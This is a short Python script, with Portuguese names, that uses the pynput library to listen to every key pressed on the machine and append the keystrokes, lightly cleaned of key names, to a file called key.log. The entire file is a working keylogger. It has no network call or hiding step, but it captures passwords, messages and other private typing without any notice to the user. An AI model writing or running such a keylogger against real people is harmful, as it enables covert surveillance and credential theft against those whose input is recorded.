from pynput.keyboard import Listener
import re


def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.shift_r', '', tecla)
    tecla = re.sub(r'Key.backspace', '', tecla)
    with open('key.log', 'a') as log:
        log.write(tecla)


with Listener(on_press=capturar) as l:
    l.join()


